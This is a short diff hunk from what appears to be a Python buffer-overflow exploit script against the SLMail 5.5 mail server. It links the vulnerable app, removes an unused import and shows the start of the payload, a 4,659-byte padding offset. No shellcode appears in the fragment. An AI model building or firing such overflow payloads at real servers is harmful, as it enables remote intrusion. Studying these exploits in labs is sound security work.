@@ -5,7 +5,6 @@
 # Vulnerable app: https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe
 
 import socket
-import sys
 
 # Offset of 4,659 Bytes
 offset = "A"*4659
